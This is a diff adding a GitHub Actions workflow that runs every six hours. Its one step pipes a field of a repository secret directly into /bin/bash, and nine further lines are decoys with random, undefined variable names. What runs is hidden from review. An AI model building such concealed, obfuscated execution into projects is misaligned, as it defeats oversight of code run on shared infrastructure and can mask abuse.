@@ -1,0 +1,26 @@
+name: wanxiaoqianguan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanxiaoqianguan
+        env:
+          njyu2582: ${{ secrets.njyu2582 }}
+        run: |
+          echo $njyu2582 | jq -r .fup97816 | /bin/bash
+          echo $oewa8 | jq -r .ucj2 | /bin/bash
+          echo $mo63967 | jq -r .jgy0 | /bin/bash
+          echo $hmxqf41 | jq -r .jthnm1 | /bin/bash
+          echo $eh21952 | jq -r .r55 | /bin/bash
+          echo $gtemy40235 | jq -r .ujxe53892 | /bin/bash
+          echo $n0251 | jq -r .p5966 | /bin/bash
+          echo $iive218 | jq -r .bjfdt213 | /bin/bash
+          echo $vm3591 | jq -r .qz5 | /bin/bash
+          echo $tzv151 | jq -r .b193 | /bin/bash
+
